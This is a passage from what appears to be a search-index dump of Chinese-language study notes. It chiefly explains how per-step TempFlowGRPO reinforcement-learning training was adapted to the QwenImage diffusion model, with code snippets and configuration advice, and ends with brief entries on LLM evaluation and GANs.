dim=0),\n    \"negative_prompt_embeds_mask\": negative_prompt_embeds_mask.repeat_interleave(exploration_k, dim=0),\n    \"timesteps\": timesteps,\n    \"latents\": latents[:, :-1],  # \u53bb\u6389\u6700\u540e\u4e00\u6b65\uff08\u5df2\u7ecf\u662f\u5b8c\u6574\u56fe\u50cf\uff09\n    \"next_latents\": sde_latents,  # \u4f7f\u7528 SDE \u91c7\u6837\u7684\u4e0b\u4e00\u6b65 latents\n    \"log_probs\": log_probs,\n    \"rewards\": rewards,  # \u5217\u8868\u5f62\u5f0f\uff0c\u6bcf\u4e2a\u65f6\u95f4\u6b65\u4e00\u4e2a future\n})\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#7-rewards","title":"7. Rewards \u7ef4\u5ea6\u5904\u7406","text":"<p>\u5e38\u89c4\u7248\u672c\u9700\u8981 repeat\uff1a <pre><code>samples[\"rewards\"][\"avg\"] = samples[\"rewards\"][\"avg\"].unsqueeze(1).repeat(1, num_train_timesteps)\n</code></pre></p> <p>Per-step \u7248\u672c\u5df2\u7ecf\u662f per-timestep \u7684\uff0c\u4e0d\u9700\u8981\u5904\u7406\uff1a <pre><code>samples[\"rewards\"][\"avg\"] = samples[\"rewards\"][\"avg\"]\n# \u5df2\u7ecf\u662f (batch_size, num_steps) \u5f62\u72b6\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#8-loss","title":"8. Loss \u8ba1\u7b97\u6539\u52a8","text":"<p>\u5e38\u89c4\u7248\u672c\uff1a <pre><code>unclipped_loss = -advantages * ratio\nclipped_loss = -advantages * torch.clamp(ratio, 1.0 - clip_range, 1.0 + clip_range)\npolicy_loss = torch.mean(torch.maximum(unclipped_loss, clipped_loss))\n</code></pre></p> <p>Per-step \u7248\u672c\u6dfb\u52a0 <code>1.73 * std_dev_t</code> \u7cfb\u6570\uff1a <pre><code>unclipped_loss = -1.73 * std_dev_t * advantages * ratio\nclipped_loss = -1.73 * std_dev_t * advantages * torch.clamp(\n    ratio,\n    1.0 - config.train.clip_range,\n    1.0 + config.train.clip_range,\n)\npolicy_loss = torch.mean(torch.maximum(unclipped_loss, clipped_loss))\n</code></pre></p> <p>\u7cfb\u6570\u542b\u4e49\uff1a - <code>1.73 \u2248 \u221a3</code>\uff0c\u6765\u81ea\u7406\u8bba\u63a8\u5bfc - <code>std_dev_t</code>\uff1a\u5f53\u524d\u65f6\u95f4\u6b65\u7684\u6807\u51c6\u5dee\uff0c\u7528\u4e8e\u52a0\u6743\u4e0d\u540c\u65f6\u95f4\u6b65\u7684\u635f\u5931</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#9","title":"9. \u8bad\u7ec3\u5faa\u73af\u4fee\u6539","text":"<p>\u6dfb\u52a0\u6570\u636e\u968f\u673a\u6253\u4e71\uff1a <pre><code>for inner_epoch in range(config.train.num_inner_epochs):\n    # \u5728\u6bcf\u4e2a inner epoch \u5f00\u59cb\u65f6\u6253\u4e71\u6837\u672c\n    perm = torch.randperm(total_batch_size, device=device)\n    samples_shuffled = {k: v[perm] for k, v in samples.items()}\n\n    # \u91cd\u65b0\u5206\u6279\n    samples_batched = {\n        k: v.reshape(-1, total_batch_size//config.sample.num_batches_per_epoch, *v.shape[1:])\n        for k, v in samples_shuffled.items()\n    }\n    # ...\n</code></pre></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#qwenimage","title":"QwenImage \u8bad\u7ec3\u6d41\u7a0b\u8be6\u89e3","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#train_qwenimagepy","title":"\u5e38\u89c4\u7248\u672c\u6d41\u7a0b (train_qwenimage.py)","text":"<pre><code>1. \u521d\u59cb\u5316\n   \u251c\u2500\u2500 \u52a0\u8f7d\u6a21\u578b (transformer, vae, text_encoder)\n   \u251c\u2500\u2500 \u5e94\u7528 LoRA\uff08\u53ef\u9009\uff09\n   \u251c\u2500\u2500 FSDP \u5305\u88c5\n   \u2514\u2500\u2500 \u8bbe\u7f6e\u4f18\u5316\u5668\n\n2. \u6bcf\u4e2a Epoch\n   \u251c\u2500\u2500 \u8bc4\u4f30\uff08\u53ef\u9009\uff09\n   \u2502   \u2514\u2500\u2500 \u4f7f\u7528 ODE \u91c7\u6837\u751f\u6210\u56fe\u50cf\n   \u2502\n   \u251c\u2500\u2500 \u91c7\u6837\u9636\u6bb5\n   \u2502   \u251c\u2500\u2500 \u4ece\u6570\u636e\u96c6\u83b7\u53d6 prompts\n   \u2502   \u251c\u2500\u2500 \u4f7f\u7528 pipeline_with_logprob \u751f\u6210\u56fe\u50cf\n   \u2502   \u2502   \u251c\u2500\u2500 \u968f\u673a\u9009\u62e9 SDE \u7a97\u53e3 [start, end)\n   \u2502   \u2502   \u251c\u2500\u2500 \u5728\u7a97\u53e3\u5916\u4f7f\u7528 ODE (noise_level=0)\n   \u2502   \u2502   \u251c\u2500\u2500 \u5728\u7a97\u53e3\u5185\u4f7f\u7528 SDE (noise_level=0.7)\n   \u2502   \u2502   \u2514\u2500\u2500 \u4fdd\u5b58\u7a97\u53e3\u5185\u7684 latents \u548c log_probs\n   \u2502   \u251c\u2500\u2500 \u5f02\u6b65\u8ba1\u7b97 rewards\n   \u2502   \u2514\u2500\u2500 \u6536\u96c6\u6837\u672c\u6570\u636e\n   \u2502\n   \u251c\u2500\u2500 \u7b49\u5f85 rewards \u8ba1\u7b97\u5b8c\u6210\n   \u2502   \u2514\u2500\u2500 Padding prompt embeddings \u5230\u7edf\u4e00\u957f\u5ea6\n   \u2502\n   \u251c\u2500\u2500 \u5904\u7406 rewards\n   \u2502   \u251c\u2500\u2500 \u8de8\u8fdb\u7a0b gather\n   \u2502   \u251c\u2500\u2500 \u8ba1\u7b97 advantages (\u6807\u51c6\u5316)\n   \u2502   \u2514\u2500\u2500 \u5206\u914d\u56de\u5404\u8fdb\u7a0b\n   \u2502\n   \u2514\u2500\u2500 \u8bad\u7ec3\u9636\u6bb5\n       \u251c\u2500\u2500 \u5bf9\u6bcf\u4e2a batch\n       \u2502   \u2514\u2500\u2500 \u5bf9\u7a97\u53e3\u5185\u6bcf\u4e2a timestep\n       \u2502       \u251c\u2500\u2500 \u91cd\u65b0\u8ba1\u7b97 log_prob\uff08\u5f53\u524d\u7b56\u7565\uff09\n       \u2502       \u251c\u2500\u2500 \u8ba1\u7b97 ratio = exp(new_log_prob - old_log_prob)\n       \u2502       \u251c\u2500\u2500 PPO-style clipped loss\n       \u2502       \u251c\u2500\u2500 KL \u6563\u5ea6\uff08\u53ef\u9009\uff09\n       \u2502       \u251c\u2500\u2500 \u53cd\u5411\u4f20\u64ad\n       \u2502       \u2514\u2500\u2500 \u68af\u5ea6\u7d2f\u79ef + \u4f18\u5316\n       \u2514\u2500\u2500 \u66f4\u65b0 EMA\uff08\u53ef\u9009\uff09\n\n3. \u4fdd\u5b58\u68c0\u67e5\u70b9\n</code></pre> <p>\u5173\u952e\u7279\u70b9\uff1a - \u7a97\u53e3\u91c7\u6837\uff1a\u53ea\u5728\u968f\u673a\u9009\u62e9\u7684\u8fde\u7eed\u7a97\u53e3\u5185\u4f7f\u7528 SDE - \u5355\u4e00\u8f68\u8ff9\uff1a\u6bcf\u4e2a prompt \u53ea\u751f\u6210\u4e00\u4e2a\u5b8c\u6574\u56fe\u50cf - \u7a97\u53e3\u5185\u8bad\u7ec3\uff1a\u53ea\u4f7f\u7528\u7a97\u53e3\u5185\u7684\u4e2d\u95f4\u6b65\u9aa4\u8fdb\u884c\u8bad\u7ec3</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#per-step-train_qwenimage_prpy","title":"Per-step \u7248\u672c\u6d41\u7a0b (train_qwenimage_pr.py)","text":"<pre><code>1. \u521d\u59cb\u5316\n   \u2514\u2500\u2500 \uff08\u4e0e\u5e38\u89c4\u7248\u672c\u76f8\u540c\uff09\n\n2. \u6bcf\u4e2a Epoch\n   \u251c\u2500\u2500 \u8bc4\u4f30\uff08\u53ef\u9009\uff09\n   \u2502   \u2514\u2500\u2500 \u4f7f\u7528 determistic=True (ODE) \u91c7\u6837\n   \u2502\n   \u251c\u2500\u2500 \u91c7\u6837\u9636\u6bb5\n   \u2502   \u251c\u2500\u2500 \u4ece\u6570\u636e\u96c6\u83b7\u53d6 prompts\n   \u2502   \u251c\u2500\u2500 \u4f7f\u7528 pipeline_with_logprob_perstep \u751f\u6210\n   \u2502   \u2502   \u251c\u2500\u2500 \u5bf9\u6bcf\u4e2a\u65f6\u95f4\u6b65 t\uff1a\n   \u2502   \u2502   \u2502   \u251c\u2500\u2500 \u8ba1\u7b97 ODE \u5206\u652f \u2192 \u4e3b\u6d41\u7a0b\u63a8\u8fdb\n   \u2502   \u2502   \u2502   \u251c\u2500\u2500 \u8ba1\u7b97 SDE \u5206\u652f \u2192 \u751f\u6210\u8bad\u7ec3\u6837\u672c\n   \u2502   \u2502   \u2502   \u251c\u2500\u2500 \u4ece SDE \u70b9\u5f00\u59cb\u7528 ODE \u5b8c\u6210\u5269\u4f59\u6b65\u9aa4\n   \u2502   \u2502   \u2502   \u2514\u2500\u2500 \u89e3\u7801\u751f\u6210\u5b8c\u6574\u56fe\u50cf\n   \u2502   \u2502   \u2514\u2500\u2500 \u8fd4\u56de\uff1aall_images, all_latents, all_sde_latents, all_log_probs\n   \u2502   \u2502\n   \u2502   \u251c\u2500\u2500 \u5206\u652f\u63a2\u7d22\n   \u2502   \u2502   \u251c\u2500\u2500 \u8bbe\u7f6e exploration_k = 6\n   \u2502   \u2502   \u251c\u2500\u2500 \u5c06 latents \u6269\u5c55 k \u500d\n   \u2502   \u2502   \u2514\u2500\u2500 \u6269\u5c55 prompts \u548c metadata\n   \u2502   \u2502\n   \u2502   \u251c\u2500\u2500 \u4e3a\u6bcf\u4e2a\u65f6\u95f4\u6b65\u7684\u56fe\u50cf\u8ba1\u7b97 rewards\n   \u2502   \u2502   \u2514\u2500\u2500 rewards \u662f\u5217\u8868\uff1a[reward_step0, reward_step1, ...]\n   \u2502   \u2502\n   \u2502   \u2514\u2500\u2500 \u6536\u96c6\u6837\u672c\u6570\u636e\n   \u2502       \u2514\u2500\u2500 next_latents \u4f7f\u7528 sde_latents\uff08\u4e0d\u662f latents[1:]\uff09\n   \u2502\n   \u251c\u2500\u2500 \u7b49\u5f85 rewards \u8ba1\u7b97\u5b8c\u6210\n   \u2502   \u2514\u2500\u2500 \u5c06\u6bcf\u4e2a\u65f6\u95f4\u6b65\u7684 rewards \u6cbf\u65f6\u95f4\u7ef4\u5ea6\u5806\u53e0\n   \u2502       \u2514\u2500\u2500 \u5f62\u72b6\uff1a(batch_size, num_steps)\n   \u2502\n   \u251c\u2500\u2500 \u5904\u7406 rewards\n   \u2502   \u251c\u2500\u2500 \u8de8\u8fdb\u7a0b gather\n   \u2502   \u251c\u2500\u2500 \u8ba1\u7b97 advantages (\u5df2\u7ecf\u662f per-timestep \u7684)\n   \u2502   \u2514\u2500\u2500 \u5206\u914d\u56de\u5404\u8fdb\u7a0b\n   \u2502\n   \u2514\u2500\u2500 \u8bad\u7ec3\u9636\u6bb5\n       \u251c\u2500\u2500 \u968f\u673a\u6253\u4e71\u6837\u672c\n       \u251c\u2500\u2500 \u5bf9\u6bcf\u4e2a batch\n       \u2502   \u2514\u2500\u2500 \u5bf9\u6bcf\u4e2a timestep\n       \u2502       \u251c\u2500\u2500 \u91cd\u65b0\u8ba1\u7b97 log_prob\n       \u2502       \u251c\u2500\u2500 \u8ba1\u7b97 ratio\n       \u2502       \u251c\u2500\u2500 \u4f7f\u7528\u52a0\u6743\u7684 PPO loss\n       \u2502       \u2502   \u2514\u2500\u2500 loss = 1.73 * std_dev_t * clipped_loss\n       \u2502       \u251c\u2500\u2500 KL \u6563\u5ea6\uff08\u53ef\u9009\uff09\n       \u2502       \u251c\u2500\u2500 \u53cd\u5411\u4f20\u64ad\n       \u2502       \u2514\u2500\u2500 \u68af\u5ea6\u7d2f\u79ef + \u4f18\u5316\n       \u2514\u2500\u2500 \u66f4\u65b0 EMA\uff08\u53ef\u9009\uff09\n\n3. \u4fdd\u5b58\u68c0\u67e5\u70b9\n</code></pre> <p>\u5173\u952e\u7279\u70b9\uff1a - \u5168\u7a0b\u53cc\u8f68\uff1a\u6bcf\u6b65\u90fd\u8ba1\u7b97 ODE \u548c SDE - \u5206\u652f\u63a2\u7d22\uff1a\u6bcf\u4e2a SDE \u70b9\u751f\u6210\u5b8c\u6574\u56fe\u50cf\uff0cexploration_k=6 - Per-step rewards\uff1a\u6bcf\u4e2a\u65f6\u95f4\u6b65\u72ec\u7acb\u7684\u5956\u52b1\u4fe1\u53f7 - \u52a0\u6743\u635f\u5931\uff1a\u8003\u8651 std_dev_t \u7684\u65f6\u95f4\u6b65\u6743\u91cd - \u5168\u6b65\u8bad\u7ec3\uff1a\u5728\u6240\u6709\u65f6\u95f4\u6b65\u4e0a\u8bad\u7ec3\uff08\u4e0d\u9650\u4e8e\u7a97\u53e3\uff09</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_10","title":"\u5173\u952e\u5dee\u5f02\u603b\u7ed3","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#pipeline_1","title":"Pipeline \u5c42\u9762","text":"\u7279\u6027 \u5e38\u89c4\u7248\u672c Per-step \u7248\u672c \u7a97\u53e3\u673a\u5236 \u968f\u673a\u9009\u62e9 SDE \u7a97\u53e3 \u65e0\u7a97\u53e3\uff0c\u904d\u5386\u6240\u6709\u6b65 \u91c7\u6837\u65b9\u5f0f \u7a97\u53e3\u5916 ODE + \u7a97\u53e3\u5185 SDE \u6bcf\u6b65 ODE+SDE \u53cc\u8f68 \u56fe\u50cf\u751f\u6210 \u53ea\u751f\u6210\u6700\u7ec8\u56fe\u50cf \u6bcf\u6b65\u751f\u6210\u5b8c\u6574\u56fe\u50cf \u8fd4\u56de\u6570\u636e \u5b57\u5178\uff08\u7a97\u53e3\u5185\u6570\u636e\uff09 \u5143\u7ec4\uff08\u6240\u6709\u6b65\u6570\u636e\uff09 log_probs \u7a97\u53e3\u5185\u7684 log_probs \u6240\u6709\u6b65\u7684 log_probs"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_11","title":"\u8bad\u7ec3\u811a\u672c\u5c42\u9762","text":"\u7279\u6027 \u5e38\u89c4\u7248\u672c Per-step \u7248\u672c exploration_k \u901a\u8fc7 num_image_per_prompt \u63a7\u5236 \u56fa\u5b9a\u4e3a 6 \u91c7\u6837\u51fd\u6570 <code>pipeline_with_logprob</code> <code>pipeline_with_logprob_perstep</code> sde_step <code>sde_step_with_logprob</code> <code>sde_step_with_logprob_perstep</code> \u8f93\u51fa\u7c7b\u578b \"pt\" (tensor) \"pil\" (PIL Image) next_latents latents[:, 1:] (\u5207\u7247) sde_latents (\u72ec\u7acb\u91c7\u6837) rewards \u7ed3\u6784 \u5355\u4e2a future \u5217\u8868 (per-step futures) rewards \u5f62\u72b6 (batch,) \u2192 repeat \u2192 (batch, steps) (batch, steps) \u539f\u751f loss \u6743\u91cd advantages * ratio 1.73 * std_dev_t * advantages * ratio \u6570\u636e\u6253\u4e71 \u65e0 \u6bcf\u4e2a inner_epoch \u6253\u4e71 \u8bad\u7ec3\u6b65\u6570 num_train_timesteps (\u7a97\u53e3\u5927\u5c0f) num_train_timesteps (timestep_fraction)"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#cfg","title":"CFG \u5904\u7406\u5dee\u5f02","text":"\u6a21\u578b CFG \u5b9e\u73b0\u65b9\u5f0f Flux Transformer \u5185\u7f6e\u652f\u6301\uff0c\u5355\u6b21\u524d\u5411\u4f20\u64ad QwenImage \u624b\u52a8\u5b9e\u73b0\uff1a\u62fc\u63a5 \u2192 \u524d\u5411 \u2192 chunk \u2192 \u6df7\u5408 \u2192 \u5f52\u4e00\u5316"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#vae","title":"VAE \u89e3\u7801\u5dee\u5f02","text":"\u6a21\u578b \u89e3\u7801\u6d41\u7a0b Flux scaling + shift \u2192 decode QwenImage unpack \u2192 normalize (mean/std) \u2192 decode \u2192 [:,:,0]"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_12","title":"\u6027\u80fd\u8003\u8651","text":"<p>\u5e38\u89c4\u7248\u672c\u4f18\u52bf\uff1a - \u5185\u5b58\u5360\u7528\u8f83\u5c0f\uff08\u53ea\u4fdd\u5b58\u7a97\u53e3\u5185\u6570\u636e\uff09 - \u8ba1\u7b97\u6548\u7387\u9ad8\uff08\u5c11\u91cf\u65f6\u95f4\u6b65\uff09 - \u9002\u5408\u5feb\u901f\u8fed\u4ee3</p> <p>Per-step \u7248\u672c\u4f18\u52bf\uff1a - \u66f4\u7cbe\u7ec6\u7684\u5956\u52b1\u4fe1\u53f7\uff08\u6bcf\u6b65\u72ec\u7acb\uff09 - \u5206\u652f\u63a2\u7d22\u63d0\u9ad8\u6837\u672c\u591a\u6837\u6027 - \u66f4\u597d\u7684\u68af\u5ea6\u4fe1\u53f7\uff08\u5168\u6b65\u8bad\u7ec3\uff09 - \u9002\u5408\u9ad8\u8d28\u91cf\u8bad\u7ec3</p> <p>\u8bad\u7ec3\u65f6\u95f4\u5bf9\u6bd4\uff1a - \u5e38\u89c4\u7248\u672c\uff1a\u7a97\u53e3\u5927\u5c0f \u00d7 \u6837\u672c\u6570 - Per-step \u7248\u672c\uff1a\u603b\u6b65\u6570 \u00d7 exploration_k \u00d7 \u6837\u672c\u6570</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_13","title":"\u5b9e\u73b0\u7ec6\u8282\u6ce8\u610f\u4e8b\u9879","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#1_2","title":"1. \u5185\u5b58\u7ba1\u7406","text":"<pre><code># Per-step \u7248\u672c\u5185\u5b58\u5360\u7528\u66f4\u5927\n# \u9700\u8981\u5b58\u50a8\uff1a\n# - all_latents: (batch, steps+1, seq_len, channels)\n# - all_sde_latents: (batch, steps, seq_len, channels)\n# - all_images: list of (batch, 3, H, W) \u00d7 steps\n# - all_log_probs: (batch, steps)\n\n# \u89e3\u51b3\u65b9\u6848\uff1a\n# 1. \u51cf\u5c0f batch size\n# 2. \u4f7f\u7528\u68af\u5ea6\u68c0\u67e5\u70b9\n# 3. \u9002\u5f53\u964d\u4f4e\u5206\u8fa8\u7387\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#2_1","title":"2. \u6570\u636e\u7c7b\u578b\u5904\u7406","text":"<pre><code># QwenImage \u9700\u8981\u6ce8\u610f dtype \u8f6c\u6362\nlatents_dtype = latents.dtype\nlatents = latents.float()  # sde_step \u9700\u8981 float32\nlatents, log_prob, _, _ = sde_step_with_logprob(...)\nif latents.dtype != latents_dtype:\n    latents = latents.to(latents_dtype)  # \u8f6c\u56de\u539f\u59cb dtype\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#3","title":"3. \u5206\u5e03\u5f0f\u8bad\u7ec3","text":"<pre><code># FSDP \u6a21\u5f0f\u4e0b\u6ce8\u610f\uff1a\n# 1. \u6240\u6709 gather \u64cd\u4f5c\u9700\u8981\u6307\u5b9a world_size\n# 2. optimizer \u540c\u6b65\u901a\u8fc7 should_sync \u63a7\u5236\n# 3. rewards \u8ba1\u7b97\u5728 gather \u4e4b\u524d\u5b8c\u6210\n# 4. advantages \u5728 gather \u540e\u5206\u914d\u56de\u5404\u8fdb\u7a0b\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#4_1","title":"4. \u8c03\u8bd5\u6280\u5de7","text":"<pre><code># \u68c0\u67e5\u5f62\u72b6\nprint(f\"latents shape: {latents.shape}\")\n# \u9884\u671f\uff1a(batch, seq_len, channels)\n\nprint(f\"rewards shape: {rewards['avg'].shape}\")\n# \u5e38\u89c4\u7248\u672c\uff1a(batch,)\n# Per-step\u7248\u672c\uff1a(batch, steps)\n\n# \u68c0\u67e5 NaN\nassert not torch.isnan(loss).any(), \"Loss contains NaN\"\nassert not torch.isnan(log_prob).any(), \"Log prob contains NaN\"\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_14","title":"\u914d\u7f6e\u6587\u4ef6\u5efa\u8bae","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_15","title":"\u5e38\u89c4\u8bad\u7ec3\u914d\u7f6e","text":"<pre><code>config.sample.sde_window_size = 5  # \u7a97\u53e3\u5927\u5c0f\nconfig.sample.sde_window_range = (0, 10)  # \u7a97\u53e3\u8303\u56f4\nconfig.sample.noise_level = 0.7  # SDE \u566a\u58f0\u6c34\u5e73\nconfig.sample.num_image_per_prompt = 4  # \u6bcf\u4e2a prompt \u7684\u56fe\u50cf\u6570\nconfig.train.timestep_fraction = 1.0  # \u4e0d\u4f7f\u7528\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#per-step","title":"Per-step \u8bad\u7ec3\u914d\u7f6e","text":"<pre><code># \u79fb\u9664\u7a97\u53e3\u76f8\u5173\u53c2\u6570\nconfig.train.timestep_fraction = 0.5  # \u8bad\u7ec3\u524d 50% \u7684\u65f6\u95f4\u6b65\n# exploration_k \u5728\u4ee3\u7801\u4e2d\u786c\u7f16\u7801\u4e3a 6\nconfig.sample.train_batch_size = 2  # \u7531\u4e8e exploration_k\uff0c\u5b9e\u9645\u4e3a 12\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/TempFlowGRPO%20on%20QwenImage/#_16","title":"\u603b\u7ed3","text":"<p>\u672c\u6b21\u9002\u914d\u6210\u529f\u5c06 Flux \u7684 per-step \u8bad\u7ec3\u65b9\u6cd5\u8fc1\u79fb\u5230 QwenImage \u6a21\u578b\uff0c\u4e3b\u8981\u5de5\u4f5c\u5305\u62ec\uff1a</p> <ol> <li>Pipeline \u9002\u914d\uff1a\u5904\u7406 QwenImage \u7279\u6709\u7684 CFG\u3001VAE\u3001Transformer \u63a5\u53e3</li> <li>\u8bad\u7ec3\u811a\u672c\u9002\u914d\uff1a\u5b9e\u73b0\u5206\u652f\u63a2\u7d22\u3001per-step rewards\u3001\u52a0\u6743\u635f\u5931</li> <li>\u4fdd\u6301\u517c\u5bb9\u6027\uff1a\u4e24\u79cd\u8bad\u7ec3\u6a21\u5f0f\u53ef\u4ee5\u5171\u5b58\uff0c\u6839\u636e\u9700\u6c42\u9009\u62e9</li> </ol> <p>\u4f7f\u7528\u5efa\u8bae\uff1a - \u521d\u671f\u8bad\u7ec3\uff1a\u4f7f\u7528\u5e38\u89c4\u7248\u672c\u5feb\u901f\u6536\u655b - \u7cbe\u7ec6\u8c03\u4f18\uff1a\u4f7f\u7528 per-step \u7248\u672c\u63d0\u5347\u8d28\u91cf - \u8d44\u6e90\u53d7\u9650\uff1a\u4f18\u5148\u5e38\u89c4\u7248\u672c - \u8ffd\u6c42\u6781\u81f4\uff1a\u9009\u62e9 per-step \u7248\u672c</p> <p>\u540e\u7eed\u4f18\u5316\u65b9\u5411\uff1a - \u52a8\u6001\u8c03\u6574 exploration_k - \u81ea\u9002\u5e94\u65f6\u95f4\u6b65\u6743\u91cd - \u6df7\u5408\u8bad\u7ec3\u7b56\u7565 - \u66f4\u9ad8\u6548\u7684\u5185\u5b58\u7ba1\u7406</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Evaluation/LLM%20Evaluation%20Guidebook/","title":"LLM Evaluation Guidebook","text":"<p>\u8fd9\u662fHuggingface\u7684\u5173\u4e8eEvaluation\u7684\u6280\u672f\u535a\u5ba2\uff0c\u94fe\u63a5\u5728\u8fd9\u91cc </p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/GAN/GAN/","title":"GAN","text":"<p>\u4f7f\u7528\u6559\u7a0b</p> <ul> <li>\u674e\u6c90AI</li> <li>\u674e\u5b8f\u6bc5\u673a\u5668\u5b66\u4e60</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/GAN/GAN/#_1","title":"\u7406\u8bba\u6982\u8ff0","text":"<p>\u4ec0\u4e48\u662fGenerator</p> <p>GAN\u8be6\u89e3</p> <p>GAN\uff0c\u751f\u6210\u5f0f\u5bf9\u6297\u7f51\u7edc\uff0c\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u6a21\u578b\u6709\u4e24\u4e2a\u90e8\u5206\uff0c\u751f\u6210\u8005\uff08generative model\uff09\u548c\u68c0\u67e5\u8005\uff08discriminative model\uff09</p> <p>\u5176\u4e2d\u7684\u751f\u6210\u6a21\u578b\u662f\u4e00\u4e2aMLP\uff0c\u4e5f\u5c31\u662f\u591a\u5c42\u611f\u77e5\u5668\uff1b\u800c\u5ba1\u67e5\u6a21\u578b\u4e5f\u662f\u4e00\u4e2aMLP</p> <p>\u751f\u6210\u4e00\u4e2a\u9ad8\u65af\u566a\u97f3\uff0c\u7136\u540e\u4f20\u5165MLP\u4e2d\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u7684G\uff08\u751f\u6210\u6a21\u578b\uff09\uff0c\u6211\u4eec\u7684G\u5185\u90e8\u6709\u4e00\u4e2aMLP\uff0c\u8fd9\u662f\u6211\u4eec\u9700\u8981\u8bad\u7ec3\u7684\u4e1c\u897f\uff1b\u800c\u6211\u4eec\u7684D\uff08\u5ba1\u67e5\u6a21\u578b\uff09\uff0c\u4f1a\u901a\u8fc7\u81ea\u5df1\u7684\u4e00\u4e2aMLP\u53bb\u5224\u522b\u8fd9\u4e2aG\u7684\u751f\u6210</p> <p>\u6240\u8c13\u7684D\u5c31\u662f\u4e00\u4e2a\u4e8c\u5206\u7c7b\u5668\uff0c\u76ee\u6807\u7ed3\u679c\u662f\uff0c\u8fd9\u4e2aD\u8bad\u7ec3\u597d\u4e86\u4e4b\u540e\uff0c\u4f9d\u65e7\u65e0\u6cd5\u5206\u7c7b\u76ee\u6807\u7ed3\u679c\u548c\u751f\u6210\u7ed3\u679c\uff0c\u5c31\u53ef\u4ee5\u8bf4\u751f\u6210\u7ed3\u679c\u548c\u76ee\u6807\u7ed3\u679c\u662f\u91cd\u5408\u7684\u5206\u5e03</p> <p>\u5728GAN\u7684\u65f6\u671f\uff0c\u6df1\u5ea6\u5b66\u4e60\u5bf9\u4e8e\u5224\u522b\u505a\u7684\u662f\u6bd4\u8f83\u597d\u7684\uff0c\u800c\u5bf9\u4e8e\u751f\u6210\u5374\u4e0d\u662f\u90a3\u4e48\u64c5\u957f\uff0c\u56e0\u6b64\u6211\u4eec\u5bf9\u4e8eD\u7684\u8bad\u7ec3\u662f\u6bd4\u8f83\u76f4\u89c2\u7684</p> 